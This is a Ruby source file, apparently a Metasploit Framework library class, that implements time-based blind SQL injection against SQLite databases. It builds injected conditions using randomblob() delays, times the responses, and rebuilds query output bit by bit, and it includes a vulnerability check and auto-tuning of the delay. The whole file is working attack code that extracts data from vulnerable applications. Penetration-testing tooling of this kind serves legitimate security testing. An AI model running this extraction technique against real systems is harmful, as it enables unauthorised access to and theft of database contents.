#
#   Time-Based Blind SQL injection support for SQLite
#
class Msf::Exploit::SQLi::SQLitei::TimeBasedBlind < Msf::Exploit::SQLi::SQLitei::Common
  HEAVYQUERY_DETECTION_SAMPLE = 10 # number of times to check if it yields a delay of @sleepdelay
  def initialize(opts, &query_proc)
    # TODO: automatically detect the sleep delay? here or in run_sql?
    @sleepdelay = opts[:sleepdelay] || 1
    super
    if opts[:heavyquery_parameter]
      @heavyquery_parameter = opts[:heavyquery_parameter]
    else
      detect_heavyquery_parameter
    end
    puts "[*] randomblob parameter: #{@heavyquery_parameter}"
  end

  def run_sql(query)
    # TODO: detect latency and update sleepdelay manually?
    puts "[*] Executing (#{query})" if @verbose
    if @hex_encode_strings
      query = hex_encode_strings(query)
      puts "[*] Encoded to (#{query})" if @verbose
    end
    # first, get the length of the output
    output_length = 0
    i = 0
    loop do
      output_bit = blind_request("length(cast((#{query}) as blob))&#{1 << i}<>0 and randomblob(#{@heavyquery_parameter})")
      output_length |= (1 << i) if output_bit
      i += 1
      stop = blind_request("length(cast((#{query}) as blob))/#{1 << i}=0 and randomblob(#{@heavyquery_parameter})")
      break if stop
    end
    puts "[*] Time-based injection: expecting output of length #{output_length}" if @verbose
    # now, get the output, of the given length
    print '[+] Data: ' if @verbose
    output = output_length.times.map do |j|
      current_character = 0
      8.times do |k|
        output_bit = blind_request("unicode(substr(cast((#{query}) as blob), #{j + 1}, 1))&#{1 << k}<>0 and randomblob(#{@heavyquery_parameter})")
        current_character |= (1 << k) if output_bit
      end
      extracted_char = current_character.chr
      print extracted_char if @verbose
      extracted_char
    end.join
    print "\n" if @verbose
    output
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("1=1 and randomblob(#{@heavyquery_parameter})")
    out_false = blind_request("1=2 and randomblob(#{@heavyquery_parameter})")
    out_true && !out_false
  end

  private

  def check_opts(opts)
    super
  end

  def blind_request(query)
    time = Time.now
    @query_proc.call(query)
    diff = Time.now - time
    diff >= @sleepdelay
  end

  def detect_heavyquery_parameter
    @heavyquery_parameter = 10000000
    # blind_request("randomblob(#{@heavyquery_parameter})")
    loop do
      break if HEAVYQUERY_DETECTION_SAMPLE.times.all? { blind_request("randomblob(#{@heavyquery_parameter})") }

      @heavyquery_parameter *= 2
    end
  end

  #
  # See SQLi#hex_encode_strings
  #
  def hex_encode_strings(query)
    super
  end
end
